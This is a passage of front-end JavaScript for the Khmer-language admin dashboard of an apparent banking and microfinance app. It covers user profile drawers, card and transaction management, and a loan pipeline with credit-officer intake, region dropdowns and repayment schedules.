          <div class="udrawer-idbox">
            <h3 class="udrawer-name">${esc(u.name)}</h3>
            <div class="udrawer-badges">${liveBadge(u)} ${roleBadge(u.role)} ${u.is_locked ? '<span class="pill bad">🔒 ផ្អាក</span>' : ''}</div>
            <div class="udrawer-contact">✉ ${esc(u.email)}${u.phone ? ' · ☎ ' + esc(u.phone) : ''}</div>
          </div>
        </div>
        <div class="udrawer-actions">
          <button class="btn primary sm" id="u_edit">✎ កែសម្រួល</button>
          <button class="btn ghost sm" id="u_lock">${u.is_locked ? '🔓 ដោះសោ' : '🔒 ផ្អាក'}</button>
          <button class="btn ghost sm" id="u_reset">⟲ Reset</button>
          <button class="btn danger sm" id="u_del">🗑 លុប</button>
        </div>
        <div class="udrawer-stats">
          ${stats.map(([ic, label, val, cls]) => `<div class="ustat ${cls}"><div class="ustat-ic">${ic}</div><div class="ustat-val">${val}</div><div class="ustat-label">${label}</div></div>`).join('')}
        </div>
        <div class="udrawer-section"><span>ព័ត៌មានគណនី</span></div>
        <div class="detail-grid ud-detail">
          <div class="detail-item"><div class="k">ចូលដោយ</div><div class="v">${esc(u.auth_provider || 'email')}</div></div>
          <div class="detail-item"><div class="k">សិទ្ធិ</div><div class="v">${u.is_admin ? 'Admin' : 'អ្នកប្រើ'}</div></div>
          <div class="detail-item"><div class="k">ចូលថ្ងៃ</div><div class="v">${dateOnly(u.created_at)}</div></div>
          <div class="detail-item"><div class="k">ចុងចាស់ប្រើ</div><div class="v">${u.last_seen_at ? ago(u.last_seen_at) : 'មិនដែល'}</div></div>
        </div>
        <div class="udrawer-section"><span>ទិន្នន័យរបស់អ្នកប្រើ</span></div>
        <div class="tabs ud-tabs" id="dTabs">${tabs.map((t, i) => `<button class="tab ${i === 0 ? 'active' : ''}" data-tab="${t[0]}">${t[1]}</button>`).join('')}</div>
        <div id="dPanel" class="sub-table ud-panel"></div>
      </div>
    </aside>`);

  const panel = $('#dPanel');
  panel.innerHTML = bodyFor(tabs[0][0]);
  $$('#dTabs .tab').forEach((b) => b.onclick = () => {
    $$('#dTabs .tab').forEach((x) => x.classList.remove('active'));
    b.classList.add('active');
    panel.innerHTML = bodyFor(b.dataset.tab);
  });
  $('#u_edit').onclick = () => { closeUserDrawer(); editUser(id); };
  $('#u_lock').onclick = async () => {
    const lock = !u.is_locked;
    await api(`/users/${id}`, { method: 'PATCH', body: { is_locked: lock } });
    toast(lock ? 'បានផ្អាកគណនី' : 'បានដោះសោ', 'ok');
    closeUserDrawer();
    render();
  };
  $('#u_reset').onclick = () => {
    closeUserDrawer();
    confirmAction('Reset ទិន្នន័យអ្នកប្រើ',
      'លុបទិន្នន័យទាំងអស់ (កាត, ប្រតិបត្តិការ, កម្ចី, គោលបំណង, ថវិកា, សេចក្តីសារ, ប្រាក់វិញ, កំណត់ត្រា) ហើយបង្កើតកាត + គោលបំណងថ្មីវិញ។',
      async () => {
        await api(`/users/${id}/reset`, { method: 'POST', body: { reseed: true } });
        toast('បានកំណត់ទិន្នន័យឡើងវិញ', 'ok');
        render();
      });
  };
  $('#u_del').onclick = () => {
    closeUserDrawer();
    confirmAction('បញ្ជាក់ការលុប',
      `លុបគណនី "${u.name}"? ទិន្នន័យទាំងអស់ (កាត, ប្រតិបត្តិការ, កម្ចី) នឹងត្រូវបានលុបផង។`,
      async () => {
        await api(`/users/${id}`, { method: 'DELETE' });
        toast('បានលុបគណនី', 'ok');
        render();
      });
  };
}

/* ---------- user profile drawer ---------- */
function openUserDrawer(html) {
  const root = $('#userDrawer');
  root.innerHTML = html;
  root.classList.remove('hidden');
  requestAnimationFrame(() => requestAnimationFrame(() => root.classList.add('open')));
  document.body.style.overflow = 'hidden';
  $$('[data-ud-close]', root).forEach((el) => el.onclick = closeUserDrawer);
}
function closeUserDrawer() {
  const root = $('#userDrawer');
  if (!root || root.classList.contains('hidden')) return;
  root.classList.remove('open');
  document.body.style.overflow = '';
  setTimeout(() => { root.classList.add('hidden'); root.innerHTML = ''; }, 300);
}
document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeUserDrawer(); });

async function renderCards() {
  const d = await api(`/cards?limit=${LIMIT}&offset=${offset}&q=${encodeURIComponent(search)}`);
  $('#content').innerHTML = `
    <div class="card">
      <div class="card-head"><h3>កាត ${d.total} សន្លាក់</h3></div>
      ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id}` },
    { label: 'ម្មាន', render: (r) => esc(r.name) },
    { label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user">${avatarHtml(r.user_name, r.avatar_thumb)}<span>${esc(r.user_name)}</span></div>` },
    { label: 'លេខកាត', render: (r) => `<span class="muted">${esc(r.number)}</span>` },
    { label: 'សម្រាប្រាប់', num: true, render: (r) => money(r.balance) },
    { label: 'ដីហទិត/ថ្ងៃ', num: true, render: (r) => money(r.daily_limit) },
    {
      label: 'ស្ថានភាព', render: (r) => [
        r.frozen ? '<span class="pill bad">បានផ្អាក</span>' : '<span class="pill ok">ធម្មតា</span>',
        r.online ? '' : '<span class="pill warn">កែប្ដូរក្រៅអន្តប្រវេស</span>',
      ].join(' ')
    },
    {
      label: 'សកម្ម', render: (r) => `<div class="row-actions">
        <button class="btn ghost sm" data-card-edit="${r.id}">កែសម្រាប់/សម្រាប់</button>
        <button class="btn danger sm" data-card-del="${r.id}">លុប</button></div>`
    },
  ], d.rows, { empty: 'រកមិនឃើញកាត' })}
      ${pagerHtml(d.total, offset, LIMIT)}
    </div>`;
  bindPager(d.total);
  $$('[data-card-edit]').forEach((b) => b.onclick = () => editCard(b.dataset.cardEdit));
  $$('[data-card-del]').forEach((b) => b.onclick = () => {
    confirmDelete('លុបកាតនេះ? ប្រតិបត្តិការដែលជាកាតនេះនឹងត្រូវបានលុបផង។', async () => {
      await api(`/cards/${b.dataset.cardDel}`, { method: 'DELETE' });
      toast('បានលុបកាត', 'ok');
      render();
    });
  });
}

async function editCard(id) {
  const d = await api(`/cards?limit=300`);
  const card = d.rows.find((c) => String(c.id) === String(id));
  if (!card) return toast('រកមិនឃើញកាត', 'err');
  openModal({
    title: `កែសម្រួលកាត · ${card.name}`,
    body: `
      <label class="field"><span>ឈ្មោះកាត</span><input id="c_name" value="${esc(card.name)}"></label>
      <label class="field"><span>សម្រាប្រាប់</span><input id="c_balance" type="number" step="0.01" value="${card.balance}"></label>
      <label class="field"><span>ដីហទិតប្រចាំថ្ងៃ</span><input id="c_limit" type="number" step="0.01" value="${card.daily_limit}"></label>
      <label class="field" style="flex-direction:row;align-items:center;gap:10px">
        <input type="checkbox" id="c_frozen" ${card.frozen ? 'checked' : ''} style="width:18px;height:18px"><span>ផ្អាកកាត (frozen)</span></label>
      <label class="field" style="flex-direction:row;align-items:center;gap:10px">
        <input type="checkbox" id="c_online" ${card.online ? 'checked' : ''} style="width:18px;height:18px"><span>អនុញ្ញាតប្រើអន្តប្រវេស</span></label>
      <p class="muted" style="margin:0">ម្មាន: ${esc(card.user_name)} · ${esc(card.number)} · ${esc(card.expiry)}</p>`,
    onSave: async () => {
      await api(`/cards/${id}`, {
        method: 'PATCH',
        body: {
          name: $('#c_name').value.trim(),
          balance: Number($('#c_balance').value),
          daily_limit: Number($('#c_limit').value),
          frozen: $('#c_frozen').checked,
          online: $('#c_online').checked,
        },
      });
      toast('បានរក្សាទុកកាត', 'ok');
      render();
    },
  });
}

let txFilters = { q: '', from: '', to: '', user_id: '' };

async function renderTransactions() {
  const p = new URLSearchParams({
    limit: LIMIT, offset, q: txFilters.q, from: txFilters.from, to: txFilters.to,
  });
  if (txFilters.user_id) p.set('user_id', txFilters.user_id);
  const d = await api('/transactions?' + p.toString());
  $('#content').innerHTML = `
    <div class="card">
      <div class="filters">
        <label class="field"><span>ស្វែងរក</span><input id="f_q" value="${esc(txFilters.q)}" placeholder="ចំណងជើង, ប្រភេទ, អ្នកប្រើ…"></label>
        <label class="field"><span>ពីថ្ងៃ</span><input id="f_from" type="date" value="${esc(txFilters.from)}"></label>
        <label class="field"><span>ដល់ថ្ងៃ</span><input id="f_to" type="date" value="${esc(txFilters.to)}"></label>
        <button class="btn primary" id="f_apply">អនុវត្ត</button>
        <button class="btn ghost" id="f_clear">សម្អាត</button>
      </div>
    </div>
    <div class="grid k3">
      <div class="card kpi"><div class="kpi-label">ចំនួនប្រតិបត្តិការ</div><div class="kpi-value">${d.total}</div></div>
      <div class="card kpi warn"><div class="kpi-label">ចំនួនប្រាក់ចំណាយ</div><div class="kpi-value">${money0(d.spent)}</div></div>
      <div class="card kpi ok"><div class="kpi-label">ចំនួនប្រាក់ចូល</div><div class="kpi-value">${money0(d.income)}</div></div>
    </div>
    <div class="card">
      ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id}` },
    { label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user">${avatarHtml(r.user_name, r.avatar_thumb)}<span>${esc(r.user_name)}</span></div>` },
    { label: 'ចំណងជើង', render: (r) => esc(r.title) },
    { label: 'ប្រភេទ', render: (r) => `<span class="pill">${esc(r.category)}</span>` },
    { label: 'កាត', render: (r) => `<span class="muted">${esc(r.card_name || '—')}</span>` },
    { label: 'ប្រាក់', num: true, render: (r) => `<span style="color:${r.is_expense ? '#ff9b9b' : '#7ee2a8'}">${r.is_expense ? '-' : '+'}${money(r.amount)}</span>` },
    { label: 'ពេល', num: true, render: (r) => `<span class="muted">${dt(r.created_at)}</span>` },
    {
      label: 'សកម្ម', render: (r) => `<button class="btn danger sm" data-tx-del="${r.id}">លុប</button>`
    },
  ], d.rows, { empty: 'រកមិនឃើញប្រតិបត្តិការ' })}
      ${pagerHtml(d.total, offset, LIMIT)}
    </div>`;
  bindPager(d.total);
  $('#f_apply').onclick = () => {
    txFilters.q = $('#f_q').value.trim();
    txFilters.from = $('#f_from').value;
    txFilters.to = $('#f_to').value;
    offset = 0; render();
  };
  $('#f_clear').onclick = () => {
    txFilters = { q: '', from: '', to: '', user_id: '' };
    offset = 0; render();
  };
  $$('[data-tx-del]').forEach((b) => b.onclick = () => {
    confirmDelete('លុបប្រតិបត្តិការនេះ? សម្រាប្រាប់កាតនឹងត្រឡប់វិញដែរ។', async () => {
      await api(`/transactions/${b.dataset.txDel}`, { method: 'DELETE' });
      toast('បានលុបប្រតិបត្តិការ', 'ok');
      render();
    });
  });
}

async function createTransaction() {
  const cards = (await api('/cards?limit=300')).rows;
  if (!cards.length) return toast('មិនទាន់មានកាតសម្រាប់បញ្ចូលប្រតិបត្តិការ', 'err');
  const users = [...new Set(cards.map((c) => `${c.user_id}|${c.user_name}`))];
  openModal({
    title: 'បង្កើតប្រតិបត្តិការដោយដៃ',
    body: `
      <label class="field"><span>អ្នកប្រើ</span>
        <select id="t_user">${users.map((u) => { const [id, n] = u.split('|'); return `<option value="${id}">${esc(n)}</option>`; }).join('')}</select></label>
      <label class="field"><span>កាត</span><select id="t_card"></select></label>
      <label class="field"><span>ចំណងជើង</span><input id="t_title" placeholder="ឧ. កែសម្រួលប្រាក់"></label>
      <label class="field"><span>ប្រភេទ</span><input id="t_category" value="ផ្សេងៗ"></label>
      <label class="field"><span>ចំនួនប្រាក់</span><input id="t_amount" type="number" step="0.01" min="0.01"></label>
      <label class="field" style="flex-direction:row;align-items:center;gap:10px">
        <input type="checkbox" id="t_expense" checked style="width:18px;height:18px"><span>ចំណាយ (បើកកំណត់សិទ្ធិ ចំណាយ)</span></label>`,
    onSave: async () => {
      const body = {
        user_id: Number($('#t_user').value),
        card_id: Number($('#t_card').value),
        title: $('#t_title').value.trim(),
        category: $('#t_category').value.trim() || 'ផ្សេងៗ',
        amount: Number($('#t_amount').value),
        is_expense: $('#t_expense').checked,
      };
      if (!body.title) throw new Error('សូមបញ្ចូលចំណងជើង');
      if (!(body.amount > 0)) throw new Error('ចំនួនប្រាក់ត្រូវ > 0');
      await api('/transactions', { method: 'POST', body });
      toast('បានបង្កើតប្រតិបត្តិការ', 'ok');
      render();
    },
  });
  const fillCards = () => {
    const uid = $('#t_user').value;
    const list = cards.filter((c) => String(c.user_id) === String(uid));
    $('#t_card').innerHTML = list.map((c) =>
      `<option value="${c.id}">${esc(c.name)} · ${money(c.balance)}</option>`).join('');
  };
  fillCards();
  $('#t_user').onchange = fillCards;
}

/* ============================================================
   LOAN PIPELINE — កម្មវិធីកម្ចីវីក្រុយ
   ============================================================ */
const LOAN_STATUS = {
  submitted: { label: 'បានដាក់ស្នើ', cls: 'info' },
  under_review: { label: 'កំពុងវាយតម្លៃ', cls: 'warn' },
  approved: { label: 'បានអនុមត្ត', cls: 'ok' },
  rejected: { label: 'បានបដិសេធ', cls: 'bad' },
  disbursed: { label: 'បានបញ្ចូល', cls: 'info' },
  active: { label: 'កំពុងបង់', cls: 'ok' },
  closed: { label: 'បានបិទ', cls: '' },
};
const METHOD_LABEL = { flat: 'Flat', annuity: 'Annuity', reducing: 'Declining' };
// ប្រាក់/ខែដែលរក្សាទុកគឺវីនុបទទី ១ — សម្រាប់ Flat/Declining ប្រាក់ថយថយជាតិតាមវីនុបទ
const payNote = (m) => m === 'annuity' ? 'វីនុបទស្មើគ្នា'
  : m === 'flat' ? 'វីនុបទទី ១ · កាន្លោះថេត'
    : 'វីនុបទទី ១ · ប្រាក់ថយថយ';
const statusPill = (s) => {
  const m = LOAN_STATUS[s] || { label: s || '—', cls: '' };
  return `<span class="pill ${m.cls}">${esc(m.label)}</span>`;
};
const scorePill = (r) => {
  if (r.score === null || r.score === undefined) return '<span class="muted">—</span>';
  const cls = r.score >= 80 ? 'ok' : r.score >= 65 ? 'info' : r.score >= 50 ? 'warn' : 'bad';
  return `<span class="pill ${cls}">${r.score} · ${esc(r.score_band || '')}</span>`;
};

let loanFilter = 'all';

async function renderLoans() {
  const q = search ? `&q=${encodeURIComponent(search)}` : '';
  const d = await api(`/loans?status=${loanFilter}${q}`);
  const rows = d.rows || [];
  const c = d.by_status || {};
  const active = (c.disbursed || 0) + (c.active || 0);
  const pending = (c.submitted || 0) + (c.under_review || 0);
  const overdue = rows.filter((r) => Number(r.overdue_count) > 0).length;
  const outstanding = rows
    .filter((r) => ['disbursed', 'active'].includes(r.status))
    .reduce((s, r) => s + Number(r.outstanding || 0), 0);

  const tabs = [['all', 'ទាំងអស់', rows.length]]
    .concat(Object.keys(LOAN_STATUS).map((k) => [k, LOAN_STATUS[k].label, c[k] || 0]));

  $('#content').innerHTML = `
    <div class="card">
      <div class="tabs">
        ${tabs.map(([k, l, n]) => `<button class="tab ${loanFilter === k ? 'active' : ''}" data-lstatus="${k}">${esc(l)} (${n})</button>`).join('')}
      </div>
    </div>
    <div class="grid k4">
      <div class="card kpi"><div class="kpi-label">សាកលកម្មរង់ចាំ</div><div class="kpi-value">${pending}</div><div class="kpi-sub">រង់ចាំវាយតម្លៃ/អនុមត្ត</div></div>
      <div class="card kpi ok"><div class="kpi-label">កម្ចីកំពុងបង់</div><div class="kpi-value">${active}</div><div class="kpi-sub">បានបញ្ចូល ឬ កំពុងបង់</div></div>
      <div class="card kpi warn"><div class="kpi-label">នៅសល់ត្រូវបង់</div><div class="kpi-value">${money0(outstanding)}</div><div class="kpi-sub">${overdue} កម្ចីមានវីនុបទផុតកំណត់</div></div>
      <div class="card kpi"><div class="kpi-label">បានបដិសេធ</div><div class="kpi-value">${c.rejected || 0}</div><div class="kpi-sub">សាកលកម្មស្រាប់</div></div>
    </div>
    <div class="card">
      <div class="card-head"><h3>បញ្ជីកម្ចី (${rows.length})</h3>
        <div class="row-actions">
          <button class="btn ghost sm" data-loan-intake="1">ទទួលកម្ចីដោយ CO</button>
          <span class="muted">ចុច "ពិនិត្យ" ដើម្បីមើលតារាងសងប្រាក់តាមខែ</span>
        </div></div>
      ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id}` },
    { label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user">${avatarHtml(r.user_name, r.avatar_thumb)}<div>
      <div>${esc(r.user_name)}</div><div class="muted" style="font-size:11.5px">${esc(r.user_phone || '')}</div></div></div>` },
    { label: 'ចំនួន', num: true, render: (r) => money(r.principal) },
    { label: 'ប្រាក់/ខែ', num: true, render: (r) => `<span title="${esc(payNote(r.interest_method))}">${money(r.monthly_payment)}</span>` },
    { label: 'វិធី', render: (r) => `<span class="muted">${esc(METHOD_LABEL[r.interest_method] || r.interest_method || '—')}</span>` },
    { label: 'ខែ/កាន្លោះ', num: true, render: (r) => `${r.months} ខែ · ${r.annual_rate}%` },
    { label: 'វាយតម្លៃ', render: (r) => scorePill(r) },
    { label: 'វីនុបទ', num: true, render: (r) => `${r.paid_count || 0}/${r.schedule_count || r.months}` },
    { label: 'ស្ថានភាព', render: (r) => statusPill(r.status) },
    {
      label: 'សកម្ម', render: (r) => `<div class="row-actions">
        <button class="btn ghost sm" data-loan-view="${r.id}">ពិនិត្យ</button>
        ${['submitted', 'under_review'].includes(r.status) ? `<button class="btn primary sm" data-loan-approve="${r.id}">អនុមត្ត</button>
        <button class="btn ghost sm" data-loan-score="${r.id}">វាយតម្លៃ</button>
        <button class="btn danger sm" data-loan-reject="${r.id}">បដិសេធ</button>` : ''}
        ${r.status === 'approved' ? `<button class="btn primary sm" data-loan-disburse="${r.id}">បញ្ចូល</button>` : ''}
        ${['disbursed', 'active'].includes(r.status) ? `<button class="btn ghost sm" data-loan-pay="${r.id}">បង់</button>` : ''}
      </div>`
    },
  ], rows, { empty: 'រកមិនឃើញកម្ចី' })}
    </div>`;

  $$('[data-lstatus]').forEach((b) => b.onclick = () => { loanFilter = b.dataset.lstatus; render(); });
  $$('[data-loan-view]').forEach((b) => b.onclick = () => showLoan(b.dataset.loanView));
  $$('[data-loan-score]').forEach((b) => b.onclick = () => scoreLoan(b.dataset.loanScore));
  $$('[data-loan-approve]').forEach((b) => b.onclick = () => approveLoan(b.dataset.loanApprove));
  $$('[data-loan-reject]').forEach((b) => b.onclick = () => rejectLoan(b.dataset.loanReject));
  $$('[data-loan-disburse]').forEach((b) => b.onclick = () => disburseLoan(b.dataset.loanDisburse));
  $$('[data-loan-pay]').forEach((b) => b.onclick = () => repayLoan(b.dataset.loanPay));
  $$('[data-loan-intake]').forEach((b) => b.onclick = () => intakeLoan());
}

/* ---------- ទទួលកម្ចីដោយ Credit Officer ---------- */
async function intakeLoan() {
  const kyc = await api('/kyc');
  const candidates = (kyc.rows || []).filter((k) => ['submitted', 'verified'].includes(k.status));
  if (!candidates.length) {
    toast('មិនមានអ្នកប្រើដែលដាក់ KYC រួចហើយ', 'err');
    return;
  }
  // Fetch regions data from API
  let regionsData = null;
  try {
    regionsData = await fetch('/regions').then(r => r.json());
  } catch (e) {
    console.error('Failed to load regions:', e);
  }
  const provinces = regionsData?.p || [];
  openModal({
    title: 'ទទួលកម្ចីដោយ Credit Officer (CO)',
    body: `<label class="field"><span>អ្នកប្រើ</span>
        <select id="i_user">
          ${candidates.map((k) => `<option value="${k.user_id}">${esc(k.user_name)} · ${esc(k.email)}</option>`).join('')}
        </select></label>
      <label class="field"><span>ឈ្មោះ Credit Officer</span><input id="i_co" placeholder="ឧ. ព្រះសារណៈ ស៊ិន"></label>
      <label class="field"><span>លេខទូរសែព្យ CO</span><input id="i_cophone"></label>
      <label class="field"><span>សង្កាត់</span><input id="i_branch" placeholder="ឧ. សង្កាត់កណ្តាល"></label>
      <label class="field"><span>ចំនួនកម្ចី</span><input id="i_principal" type="number" min="1" max="50000" value="2000"></label>
      <label class="field"><span>រយៈខែ</span><input id="i_months" type="number" min="1" max="60" value="12"></label>
      <label class="field"><span>កាន្លោះ (%/ឆ្នាំ)</span><input id="i_rate" type="number" step="0.01" value="18"></label>
      <label class="field"><span>វិធីគណនា</span>
        <select id="i_method">
          <option value="annuity">Annuity — ស្មើគ្នា</option>
          <option value="flat">Flat — កាន្លោះថេត</option>
          <option value="reducing">Declining — កាន្លោះថយថយ</option>
        </select></label>
      <label class="field"><span>ខេត្ត</span>
        <select id="i_province">
          <option value="">-- ជ្រើសរើសខេត្ត --</option>
          ${provinces.map((p) => `<option value="${esc(p.n)}">${esc(p.n)}</option>`).join('')}
        </select></label>
      <label class="field"><span>ស្រុក</span>
        <select id="i_district" disabled><option value="">-- ជ្រើសរើសខេត្តមុន --</option></select></label>
      <label class="field"><span>ឃុំ</span>
        <select id="i_commune" disabled><option value="">-- ជ្រើសរើសស្រុកមុន --</option></select></label>
      <label class="field"><span>ភូមិ</span>
        <select id="i_village" disabled><option value="">-- ជ្រើសរើសឃុំមុន --</option></select></label>
      <label class="field"><span>គោលកម្ចី</span><input id="i_purpose"></label>`,
    wide: true,
    saveLabel: 'បង្កើតសាកលកម្ម',
    onOpen: () => {
      // Cascading dropdown logic
      const provinceSelect = document.getElementById('i_province');
      const districtSelect = document.getElementById('i_district');
      const communeSelect = document.getElementById('i_commune');
      const villageSelect = document.getElementById('i_village');
      
      provinceSelect.addEventListener('change', () => {
        const provinceName = provinceSelect.value;
        const province = provinces.find(p => p.n === provinceName);
        
        districtSelect.innerHTML = '<option value="">-- ជ្រើសរើសស្រុក --</option>';
        communeSelect.innerHTML = '<option value="">-- ជ្រើសរើសឃុំ --</option>';
        villageSelect.innerHTML = '<option value="">-- ជ្រើសរើសភូមិ --</option>';
        
        if (province && province.d && province.d.length > 0) {
          districtSelect.disabled = false;
          province.d.forEach(d => {
            districtSelect.innerHTML += `<option value="${esc(d.n)}">${esc(d.n)}</option>`;
          });
        } else if (province && province.m && province.m.length > 0) {
          // Some provinces have communes directly
          districtSelect.disabled = true;
          districtSelect.innerHTML = '<option value="">មិនមានស្រុក</option>';
          communeSelect.disabled = false;
          province.m.forEach(m => {
            communeSelect.innerHTML += `<option value="${esc(m.n)}">${esc(m.n)}</option>`;
          });
        } else {
          districtSelect.disabled = true;
          communeSelect.disabled = true;
          villageSelect.disabled = true;
        }
      });
      
      districtSelect.addEventListener('change', () => {
        const provinceName = provinceSelect.value;
        const districtName = districtSelect.value;
        const province = provinces.find(p => p.n === provinceName);
        const district = province?.d?.find(d => d.n === districtName);
        
        communeSelect.innerHTML = '<option value="">-- ជ្រើសរើសឃុំ --</option>';
        villageSelect.innerHTML = '<option value="">-- ជ្រើសរើសភូមិ --</option>';
        
        if (district && district.m && district.m.length > 0) {
          communeSelect.disabled = false;
          district.m.forEach(m => {
            communeSelect.innerHTML += `<option value="${esc(m.n)}">${esc(m.n)}</option>`;
          });
        } else {
          communeSelect.disabled = true;
          villageSelect.disabled = true;
        }
      });
      
      communeSelect.addEventListener('change', () => {
        const provinceName = provinceSelect.value;
        const districtName = districtSelect.value;
        const communeName = communeSelect.value;
        const province = provinces.find(p => p.n === provinceName);
        const district = province?.d?.find(d => d.n === districtName);
        const commune = district?.m?.find(m => m.n === communeName);
        
        villageSelect.innerHTML = '<option value="">-- ជ្រើសរើសភូមិ --</option>';
        
        if (commune && commune.v && commune.v.length > 0) {
          villageSelect.disabled = false;
          commune.v.forEach(v => {
            villageSelect.innerHTML += `<option value="${esc(v)}">${esc(v)}</option>`;
          });
        } else {
          villageSelect.disabled = true;
        }
      });
    },
    onSave: async () => {
      const res = await api('/loans/intake', {
        method: 'POST',
        body: {
          user_id: Number($('#i_user').value),
          co_name: $('#i_co').value.trim(),
          co_phone: $('#i_cophone').value.trim(),
          co_branch: $('#i_branch').value.trim(),
          principal: Number($('#i_principal').value),
          months: Number($('#i_months').value),
          annual_rate: Number($('#i_rate').value),
          interest_method: $('#i_method').value,
          province: $('#i_province').value,
          district: $('#i_district').value.trim(),
          commune: $('#i_commune').value.trim(),
          village: $('#i_village').value.trim(),
          purpose: $('#i_purpose').value.trim(),
        },
      });
      toast(`បានបង្កើតសាកលកម្ចី #${res.id}`, 'ok');
      render();
    },
  });
}

/* ---------- ព័ត៌មានលម្អិត + តារាងសងប្រាក់ ---------- */
async function showLoan(id) {
  const d = await api(`/loans/${id}`);
  const l = d.loan;
  const sched = d.schedule || [];
  const scoreParts = (d.score_detail || []).map((p) => `
    <div class="bar-row"><span>${esc(p.label)}</span>
      <span class="bar-track"><span class="bar-fill" style="width:${Math.round((p.points / p.max) * 100)}%"></span></span>
      <span class="bar-val">${p.points}/${p.max}</span></div>`).join('');

  const body = `
    <div class="detail-grid">
      <div class="detail-item"><div class="k">អ្នកប្រើ</div><div class="v">${esc(l.user_name)}</div></div>
      <div class="detail-item"><div class="k">ស្ថានភាព</div><div class="v">${statusPill(l.status)}</div></div>
      <div class="detail-item"><div class="k">ចំនួនប្រាក់</div><div class="v">${money(l.principal)}</div></div>
      <div class="detail-item"><div class="k">ប្រាក់ប្រចាំខែ</div><div class="v">${money(l.monthly_payment)} <span class="muted" style="font-size:11px">${esc(payNote(l.interest_method))}</span></div></div>
      <div class="detail-item"><div class="k">រយៈខែ / កាន្លោះ</div><div class="v">${l.months} ខែ · ${l.annual_rate}%</div></div>
      <div class="detail-item"><div class="k">វិធីគណនា</div><div class="v">${esc(METHOD_LABEL[l.interest_method] || '—')}</div></div>
      <div class="detail-item"><div class="k">ប្រាក់ដាក់សរុប</div><div class="v">${money(l.total_interest)}</div></div>
      <div class="detail-item"><div class="k">ត្រូវបង់សរុប</div><div class="v">${money(l.total_payable)}</div></div>
      <div class="detail-item"><div class="k">នៅសល់</div><div class="v">${money(l.outstanding)}</div></div>
      <div class="detail-item"><div class="k">បានបង់</div><div class="v">${l.paid || 0}/${l.months} វីនុបទ</div></div>
      <div class="detail-item"><div class="k">ថ្លៃសេវកម្ម</div><div class="v">${money(l.fee_amount)} (${l.fee_percent || 0}%)</div></div>
      <div class="detail-item"><div class="k">វាយតម្លៃ</div><div class="v">${scorePill(l)}</div></div>
      <div class="detail-item"><div class="k">CBC</div><div class="v">${esc(l.cbc_status || '—')}</div></div>
      <div class="detail-item"><div class="k">កាលបរិច្ឆេទបង់ដំបូង</div><div class="v">${dateOnly(l.first_due_date)}</div></div>
      <div class="detail-item"><div class="k">ទីតាំង</div><div class="v">${esc([l.province, l.district, l.commune, l.village].filter(Boolean).join(' / ') || '—')}</div></div>
      <div class="detail-item"><div class="k">ប្រភាព</div><div class="v">${l.channel === 'co' ? `Credit Officer — ${esc(l.co_name || '')} ${esc(l.co_branch || '')}` : 'Online'}</div></div>
      <div class="detail-item"><div class="k">បង់ស្វត្តកម្ម</div><div class="v">${l.auto_debit ? '<span class="pill ok">បានបើក</span>' : '<span class="pill warn">បិទ</span>'}</div></div>
    </div>
    ${['disbursed', 'active'].includes(l.status) ? `<div class="row-actions" style="margin:8px 0">
        <button class="btn ghost sm" data-loan-autodebit="${l.id}" data-on="${l.auto_debit ? '1' : '0'}">${l.auto_debit ? 'បិទស្វត្តកម្ម' : 'បើកស្វត្តកម្ម'}</button>
        <button class="btn ghost sm" data-loan-runautodebit="1">ដំណើរការបង់ស្វត្តកម្ម</button>
      </div>` : ''}
    ${l.reject_reason ? `<div class="detail-item"><div class="k">មូលហេតុបដិសេធ</div><div class="v">${esc(l.reject_reason)}</div></div>` : ''}
    ${scoreParts ? `<div><h4 style="margin:6px 0">ការវាយតម្លៃឥណទិសជាតិ</h4><div class="bars">${scoreParts}</div></div>` : ''}
    ${d.kyc ? `<div><h4 style="margin:6px 0">KYC / CRM</h4>
      <div class="detail-grid">
        <div class="detail-item"><div class="k">ឈ្មោះ</div><div class="v">${esc(d.kyc.full_name)}</div></div>
        <div class="detail-item"><div class="k">អត្តសញ្ញាណ</div><div class="v">${esc(d.kyc.national_id)}</div></div>
        <div class="detail-item"><div class="k">លេខទូរសែព្យ</div><div class="v">${esc(d.kyc.phone)}</div></div>
        <div class="detail-item"><div class="k">មុខរដ្ឋាន</div><div class="v">${esc(d.kyc.occupation)}</div></div>
        <div class="detail-item"><div class="k">អាជីវណ៍</div><div class="v">${esc(d.kyc.business_name || '—')} (${d.kyc.business_years || 0} ឆ្នាំ)</div></div>
        <div class="detail-item"><div class="k">ប្រាក់ចូល/ចំណាយ</div><div class="v">${money(d.kyc.monthly_income)} / ${money(d.kyc.monthly_expense)}</div></div>
        <div class="detail-item"><div class="k">គណនីបញ្ចូល</div><div class="v">${esc(d.kyc.bank_name || '—')} ${esc(d.kyc.bank_account || '')} ${l.account_verified ? '✓ បានផ្ទៀងផ្ទាត់' : '✗ មិនទាន់ផ្ទៀងផ្ទាត់'}</div></div>
        <div class="detail-item"><div class="k">KYC ស្ថានភាព</div><div class="v">${esc(d.kyc.status)}</div></div>
      </div></div>` : '<div class="muted">អ្នកប្រើនេះមិនទាន់បានបំពេញ KYC</div>'}
    <div><h4 style="margin:6px 0">តារាងសងប្រាក់តាមខែ (${sched.length})</h4>
      ${tableHtml([
    { label: 'វីនុបទ', num: true, render: (r) => r.installment_no },
    { label: 'កាលបរិច្ឆេទ', render: (r) => dateOnly(r.due_date) },
    { label: 'ប្រាក់ដាក់', num: true, render: (r) => money(r.principal_part) },
    { label: 'កាន្លោះ', num: true, render: (r) => money(r.interest_part) },
    { label: 'សរុប', num: true, render: (r) => money(r.total_due) },
    { label: 'បានបង់', num: true, render: (r) => money(r.paid_amount) },
    {
      label: 'ស្ថានភាព', render: (r) => r.status === 'paid'
        ? '<span class="pill ok">បានបង់</span>'
        : r.status === 'overdue' ? `<span class="pill bad">ផុត ${r.days_late} ថ្ងៃ</span>`
          : r.status === 'partial' ? '<span class="pill warn">បានបង់ខ្លះ</span>'
            : '<span class="pill info">រង់ចាំ</span>'
    },
  ], sched, { empty: 'មិនទាន់មានតារាងសងប្រាក់ (អនុមត្តជាមុន)' })}
    </div>
    ${(d.payments || []).length ? `<div><h4 style="margin:6px 0">កំណត់ចំនាំការបង់</h4>
      ${tableHtml([
    { label: 'ថ្ងៃ', render: (r) => dt(r.created_at) },
    { label: 'វីនុបទ', num: true, render: (r) => r.installment_no },
    { label: 'ប្រាក់', num: true, render: (r) => money(r.amount) },
